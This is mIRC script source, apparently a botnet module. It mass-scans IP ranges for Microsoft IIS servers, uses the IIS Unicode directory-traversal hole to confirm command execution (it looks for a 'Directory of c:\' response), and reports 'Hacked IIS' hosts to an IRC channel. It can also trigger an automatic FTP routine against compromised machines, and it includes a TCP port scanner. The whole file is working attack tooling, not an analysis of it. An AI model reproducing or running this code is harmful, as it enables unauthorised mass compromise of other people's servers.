alias check.iss { if (%unicod.step == 1) { .msg %unicod.obj 10NO ANSWER may be 4*nix | sockclose $sock($2) |  nick $remove($me,[Unicod])  } }
alias unicod.stat { if ($sock(unicod.*,0) < 50) {   
    :start | inc %unicod.page 
    if ($read -l $+ %unicod.page ib.eXe == $null) { .timerunicod_start off 
      .msg %unicod.obj 12End BAGs List 10Found 14( $+ 19 $+ %unicod.read $+ 14 $+ ) 
    nick $remove($me,[Unicod]) | sockclose unicod.*  | halt }
.sockopen unicod. $+ %unicod.page $1 80 | if ($sock(unicod.*,0) < 50) { goto start } } }
on *:sockopen:unicod.*: { if (%unicod.step == 1) { if ($sockerr > 0) {
      .msg %unicod.obj 10NO IIS 14( $+ 19 $+ $sock($sockname).ip $+ 14 $+ )
    nick $remove($me,[Unicod])  |  sockclose $sockname  | return  }
    .sockwrite -n $sockname HEAD / HTTP/1.0 | .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
    .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible) | .sockwrite -n $sockname Host: $ip
  .sockwrite -n $sockname | halt }
  if ($sockerr > 0) { sockclose $sockname  | return }
  .sockmark $sockname $read -l $gettok($sock($sockname),2,46) ib.eXe
  .sockwrite -n $sockname GET $sock($sockname).mark HTTP/1.0
  .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
.sockwrite -n $sockname Host: $ip | .sockwrite -n $sockname }
on *:sockread:unicod.*: { .sockread -f %subsock
  if (%unicod.step == 1) { if ($sockerr > 0) { .msg %unicod.obj 10NO IIS 14( $+ 19 $+ $sock($sockname).ip $+ 14 $+ ) 
    nick $remove($me,[Unicod])  | sockclose $sockname | return  }
  if (Server: Microsoft-IIS isin %subsock) { set %unicod.step 2  |  .timerunicod_start  0 1 unicod.stat $sock($sockname).ip  | halt  } |  halt }
  if ($sockerr > 0) { sockclose $sockname | return  }
  if (Directory of c:\ isin %subsock) { inc %unicod.read
    .msg %unicod.obj 10Found BAG!!! 14( $+ 19 $+ $sock($sockname).ip $+ $sock($sockname).mark $+ 14 $+ ) 
    write unicod_ready $sock($sockname).ip $+ $sock($sockname).mark
    if (%unicod.read > 3) { .msg %unicod.obj 10Found 3 BUG on IIS 14( $+ 19 $+ $sock($sockname).ip $+ 14 $+ ) 4Unicode Disable
nick $remove($me,[Unicod])  | .timerunicod_start off | sockclose unicod.* | halt   } | sockclose $sockname   } }
alias scanstart { if (%scanport.end == on) {     set %scanport.status off | set %scanport.end off |  halt } 
  if (%s1Count > %s2Count) {  .msg %target.obj 12End Scan 10IP 14( $+ 19 $+ %ipCount $+ 14 $+ ) 10Open ports 14( $+ 19 $+ %scan.openport $+ 14 $+ )
  nick $remove($me,[ScanPort]) | sockclose scanport.* | set %scanport.status off |  halt  }
scanport %ipCount %s1Count | inc %s1Count | .timerscan -mo 1 40 scanstart2 }
alias scanstart2 { if (%scanport.end == on) {   set %scanport.status off | set %scanport.end off |  halt } 
  if (%s1Count > %s2Count) {  .msg %target.obj 12End Scan 10IP 14( $+ 19 $+ %ipCount $+ 14 $+ ) 10Open ports 14( $+ 19 $+ %scan.openport $+ 14 $+ )
  nick $remove($me,[ScanPort]) | sockclose scanport.* | set %scanport.status off |  halt  }
scanport %ipCount %s1Count | inc %s1Count | .timerscan -mo 1 40 scanstart }
alias scanport { sockclose scanport. $+ $1 $+ . $+ $2 | sockopen scanport. $+ $1 $+ . $+ $2 $1 $2 }
on 1:sockopen:scanport.*: { if ($sockerr > 0) { sockclose $sockname |  return }
  if (%scan.rezult == hide) { write sp.eXe Scanport process[ %ipCount  ] : open port at: $gettok($sockname,6,46) 
  inc %scan.openport | sockclose $sockname | halt  }
  .timersockopip $+ $gettok($sockname,6,46) 1 4  .msg %target.obj 12Scanport process 10IP 14( $+ 19 $+ %ipCount $+ 14 $+ ) 10Found Open Port 14( $+ 19 $+ $gettok($sockname,6,46) $+ 14 $+ )
  write sp.eXe Scanport process[ %ipCount  ] : open port at: $gettok($sockname,6,46) 
inc %scan.openport | sockclose $sockname }
alias uniscanstat { if ($sock(uniscan.*,0) < 50) {
    :start | if (%uni.oneip > %uni.twoip) {     .timeruniscan_start off  | set %iniscan.stat.server off |    sockclose uniscan.*  |       halt        }
    .sockopen uniscan. $+ %uni.oneip $longip(%uni.oneip) 80 | inc  %uni.oneip | .timeruniscan_stop $+ %uni.oneip 1 10 sockclose uniscan. $+ %uni.oneip
if ($sock(uniscan.*,0) < 50) { goto start } } }
on *:sockopen:uniscan.*: { if ($sockerr > 0) { sockclose $sockname  | return }
  .sockwrite -n $sockname HEAD / HTTP/1.0 | .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
.sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible) | .sockwrite -n $sockname Host: $ip | .sockwrite -n $sockname }
on *:sockread:uniscan.*: { .sockread -f %subsock | if ($sockerr > 0) { sockclose $sockname  | return }
if (Server: Microsoft-IIS isin %subsock) {  write unicod_look $sock($sockname).ip |  inc %uniscan.found |    sockclose $sockname    } }
on *:sockopen:unibag.*: { if ($sockerr > 0) { sockclose $sockname  | return }
  .sockmark $sockname $read -l $gettok($sock($sockname),2,46) ib.eXe | .sockwrite -n $sockname GET $sock($sockname).mark HTTP/1.0
  .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */* | .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
.sockwrite -n $sockname Host: $ip | .sockwrite -n $sockname }
on *:sockread:unibag.*: { .sockread -f %subsock | if ($sockerr > 0) { sockclose $sockname  | return  }
  if (Directory of c:\ isin %subsock) { inc %uniscan.bag  |    .msg %uniscan.chan 10Found IIS Bag 14( $+ 19 $+ $sock($sockname).ip $+ $sock($sockname).mark 3) $+ 14 $+ )
    write unicod_ready $sock($sockname).ip $+ $sock($sockname).mark
    if (%aftp.mode == on) && (%aftp.server != $null) && (%aftp.login != $null) && (%aftp.pass != $null) {  .timeraftp 1 3 aftp.start  $sock($sockname).ip $+ $sock($sockname).mark  }
.timerunibag.break off | .timerunibag.stat off | sockclose unibag.*  |    set %unibag.job on | unibag.start } }
alias unibag.start { if (%unibag.job == on) { if ( (%iniscan.stat.server == off) && ($lines(unicod_look) == 0) ) { 
      set %iniscan.stat.bag off  |    .timerunibaggi_work off
      .msg %uniscan.chan 12End Scan IIS 10At 14( $+ 19 $+ %uniscan.work $+ 14 $+ ) 10Found IIS Servers 14( $+ 19 $+ %uniscan.found $+ 14 $+ ) 10Hacked IIS 14( $+ 19 $+ %uniscan.bag  $+ 14 $+ )
    nick %uniscan.wnick | halt }
    if ($lines(unicod_look) == 0) { halt }
    set %unibag.job off |  set %uni.bcheck $read -l1 unicod_look |     write -dl1 unicod_look |   set %unibag.page 0
.timerunibag.stat 0 1 unibag.stat %uni.bcheck | .timerunibag.break 1 60 unibag.break } }
alias unibag.break {  .timerunibag.stat off |  sockclose unibag.*  |    set %unibag.job on | unibag.start }
alias unibag.stat { if ($sock(unibag.*,0) < 50) {   
    :start | inc %unibag.page 
    if ($read -l $+ %unibag.page ib.eXe == $null) {  .timerunibag.break off | .timerunibag.stat off |  sockclose unibag.*  |    set %unibag.job on | unibag.start | halt    }
.sockopen unibag. $+ %unibag.page $1 80 | if ($sock(unibag.*,0) < 50) { goto start } } }
on *:DISCONNECT: { unset %auth* | set %scanport.status off | set %iniscan.stat.bag off | if (Uniscan isin $me) { nick %uniscan.wnick } }
